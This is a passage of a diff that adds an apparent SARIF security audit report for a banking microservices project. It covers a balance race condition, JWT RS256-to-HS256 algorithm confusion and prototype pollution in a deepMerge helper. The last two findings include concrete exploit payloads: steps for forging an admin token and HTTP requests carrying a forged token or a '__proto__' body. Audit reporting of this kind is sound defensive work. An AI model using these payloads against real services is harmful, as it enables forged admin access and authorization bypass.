\"ref_race_2\"\n}\n```\nBoth goroutines observe `acc.Balance == 1250.0 \u003e= 1000.0` during the 15ms window, and both proceed to debit, resulting in a total of 2000.0 debited from an account holding only 1250.0."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/core-banking/internal/service/banking.go"
+                },
+                "region": {
+                  "startLine": 96,
+                  "endLine": 111
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "Improper Verification of Cryptographic Signature",
+          "level": "error",
+          "message": {
+            "text": "JWT Key Confusion / Algorithm Confusion Vulnerability (RS256 to HS256): Data Path Analysis:\n- Source: Route `POST /api/v1/auth/verify` receives `body.token` from untrusted client HTTP requests and passes it to `jwtService.verifyToken(body.token)`.\n- Sanitization/Validation: `verifyToken` decodes `header.alg` directly from the untrusted token without enforcing an expected algorithm whitelist or restricting tokens to asymmetric RS256 signatures.\n- Sink: At lines 63-70, if `header.alg === 'HS256'`, the service verifies the token using `crypto.createHmac('sha256', this.publicKeyPEM)`, treating the public RSA PEM key string as the HMAC secret key. An attacker who obtains or knows the public key can craft and sign arbitrary tokens with HS256, forging any claims/roles (e.g. elevating privileges to enterprise admin) that pass signature verification.\n\nConceptual Exploit Payload:\n1. Construct a header with `\"alg\": \"HS256\"`, `\"typ\": \"JWT\"`.\n2. Construct payload with arbitrary claims:\n```json\n{\n  \"sub\": \"cust_001\",\n  \"name\": \"Attacker\",\n  \"tier\": \"TIER_ENTERPRISE\",\n  \"role\": \"admin\",\n  \"exp\": 1999999999\n}\n```\n3. Sign `base64url(header) + \".\" + base64url(payload)` using HMAC-SHA256 with the server's public key string as the HMAC key.\n4. Send verification request:\n```http\nPOST /api/v1/auth/verify HTTP/1.1\nHost: localhost:8082\nContent-Type: application/json\n\n{\n  \"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\u003cbase64url_payload\u003e.\u003cforged_hmac_signature\u003e\"\n}\n```"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/identity-service/src/services/jwt_service.js"
+                },
+                "region": {
+                  "startLine": 63,
+                  "endLine": 70
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "Prototype Pollution",
+          "level": "error",
+          "message": {
+            "text": "Prototype Pollution via Unsanitized Object Key Recursion in deepMerge: Data Path Analysis:\n- Source: In `services/identity-service/src/index.js`, the endpoint `PATCH /api/v1/customers/:id/profile` receives untrusted JSON updates from the request body and forwards them to `customerStore.updateProfile(customerId, body)`.\n- Sanitization/Validation: `deepMerge` does not filter dangerous keys such as `__proto__`, `constructor`, or `prototype`.\n- Sink: When `key` is `\"__proto__\"`, accessing `target[key]` evaluates to `Object.prototype`. The recursive call `deepMerge(target[key], val)` then assigns properties directly onto `Object.prototype` at line 18 (`target[key] = val`), polluting global prototype properties across the Node.js runtime.\n\nConceptual Exploit Payload:\nSend an HTTP PATCH request with a crafted JSON payload targeting `__proto__`:\n```http\nPATCH /api/v1/customers/cust_001/profile HTTP/1.1\nHost: localhost:8082\nContent-Type: application/json\n\n{\n  \"__proto__\": {\n    \"polluted\": true,\n    \"isAdmin\": true\n  }\n}\n```\nFollowing this request, `({}).polluted === true` and `({}).isAdmin === true` in the application environment, allowing authorization bypass, denial of service, or further exploitation."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/identity-service/src/utils/merge.js"
+                },
+                "region": {
+                  "startLine": 10,
+                  "endLine": 20
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
